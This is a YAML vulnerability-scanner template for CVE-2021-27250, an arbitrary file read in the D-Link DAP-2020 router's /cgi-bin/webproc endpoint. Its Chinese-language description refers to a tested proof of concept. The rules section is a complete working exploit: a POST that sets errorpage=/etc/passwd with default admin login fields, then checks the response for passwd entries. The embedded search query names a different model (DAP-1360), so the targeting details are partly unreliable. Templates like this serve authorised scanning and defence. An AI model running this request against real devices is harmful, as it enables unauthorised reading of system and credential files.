expression: r0()
id: CVE-2021-27250
info:
  author: zan8in
  description: "\u8FD1\u65E5D-Link\u53D1\u5E03\u516C\u544A[1]\u79F0\u65D7\u4E0B\u4EA7\
    \u54C1DAP-2020\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\
    CVE\u7F16\u53F7\u4E3ACVE-2021-27250\uFF0C\u76EE\u524D\u5DF2\u5728\u786C\u4EF6\u7248\
    \u672C\uFF1AA1\uFF0C\u56FA\u4EF6\u7248\u672C\uFF1A1.01 \u4E0A\u6D4B\u8BD5\u4E86\
    PoC\uFF0C\u7531\u4E8E\u6F0F\u6D1E\u5F71\u54CD\u6838\u5FC3\u7EC4\u4EF6\uFF0C\u56E0\
    \u6B64\u5176\u4ED6\u7248\u672C\u4E5F\u53EF\u80FD\u53D7\u5230\u6B64\u6F0F\u6D1E\
    \u7684\u5F71\u54CD\nbody=\"DAP-1360\" && body=\"6.05\"\n"
  name: "D-LINK DAP-2020 webproc \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/D-Link/D-LINK%20DAP-2020%20webproc%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-27250.html
  severity: critical
rules:
  r0:
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      body: 'getpage=html%2Findex.html&errorpage=/etc/passwd&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin&%3Apassword=123&%3Aaction=login&%3Asessionid=3c1f7123

        '
      method: POST
      path: /cgi-bin/webproc
